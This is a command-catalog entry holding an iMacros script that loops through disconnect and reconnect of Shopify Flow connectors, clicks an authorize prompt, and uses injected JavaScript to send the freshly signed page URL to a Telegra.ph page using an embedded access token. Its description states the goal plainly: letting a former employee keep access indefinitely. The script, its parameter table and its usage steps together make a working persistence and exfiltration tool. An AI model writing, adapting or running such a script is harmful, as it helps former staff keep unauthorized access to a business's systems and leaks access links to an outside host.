---
data: >-
  VERSION BUILD=10021450

  SET !LOOP 100

  TAG POS=2 TYPE=SPAN ATTR=TXT:Disconnect

  WAIT SECONDS=10

  TAG POS=2 TYPE=SPAN ATTR=TXT:Connect

  WAIT SECONDS=10

  TAG POS=1 TYPE=DIV ATTR=TXT:Jorge<SP>Perez<SP>Hilton

  WAIT SECONDS=10

  TAG POS=2 TYPE=SPAN ATTR=TXT:Permitir

  WAIT SECONDS=10

  SET !VAR1 EVAL("var HttpR = new XMLHttpRequest();var
  urlQ=\"https://api.telegra.ph/editPage/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23?access_token=3929aa6b0e9a7d6653a7f40a0e7d8dacd1532125289a16b8949306d11b66&title=Realtime+Updated+URL+to+Access+Flow+Connectors&author_name=ex-employee+and+a+very+bad+guy.&content=[{\"tag\":\"p\",\"children\":[\"\"+encodeURIComponent(window.location.href)+\"\"]}]&return_content=true\";HttpR.open(\"GET\",
  urlQ);HttpR.send();")

  WAIT SECONDS=1760
tags:
  - automation
  - refresh
type: command
output: null
executor: imacros
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.773Z'
id: 5c00927d-cb64-47f8-9b21-c4fd9024b129
verified: false
validated: true
submitted: true
---
# imacros-refresh-flow-url

## Command

```imacros
VERSION BUILD=10021450
SET !LOOP 100
TAG POS=2 TYPE=SPAN ATTR=TXT:Disconnect
WAIT SECONDS=10
TAG POS=2 TYPE=SPAN ATTR=TXT:Connect
WAIT SECONDS=10
TAG POS=1 TYPE=DIV ATTR=TXT:Jorge<SP>Perez<SP>Hilton
WAIT SECONDS=10
TAG POS=2 TYPE=SPAN ATTR=TXT:Permitir
WAIT SECONDS=10
SET !VAR1 EVAL("var HttpR = new XMLHttpRequest();var urlQ=\"https://api.telegra.ph/editPage/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23?access_token=3929aa6b0e9a7d6653a7f40a0e7d8dacd1532125289a16b8949306d11b66&title=Realtime+Updated+URL+to+Access+Flow+Connectors&author_name=ex-employee+and+a+very+bad+guy.&content=[{\"tag\":\"p\",\"children\":[\"\"+encodeURIComponent(window.location.href)+\"\"]}]&return_content=true\";HttpR.open(\"GET\", urlQ);HttpR.send();")
WAIT SECONDS=1760
```

## Description

This iMacros script automates the disconnect/connect cycle in Shopify Flow connectors to refresh signed URLs, captures the current page URL via JavaScript, and updates a Telegra.ph page via API for persistent access reference. Use in Firefox with iMacros extension to maintain ex-staff access indefinitely.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| !LOOP | Number of iterations (100 for ~2 days) | Yes |
| WAIT SECONDS | Delays between actions (10s for UI, 1760s ~30min cycle) | Yes |
| access_token | Telegra.ph token for editing the page | Yes |
| urlQ | API endpoint URL with encoded current href | Yes |

## Examples

### Basic Usage

Load script in iMacros > Play on Flow connectors page.

### Advanced Usage

Modify !LOOP to higher value for longer runtime; adjust waits for slower connections.

## Expected Output

Script executes loops: UI tags clicked for disconnect/connect/authorize, XMLHttpRequest sent to Telegra.ph updating page with fresh URL (e.g., JSON response from API confirming edit), no console errors, page refreshes with new valid access.

## Related

- [[Related Procedure: Automate-Persistent-Access-with-iMacros]]
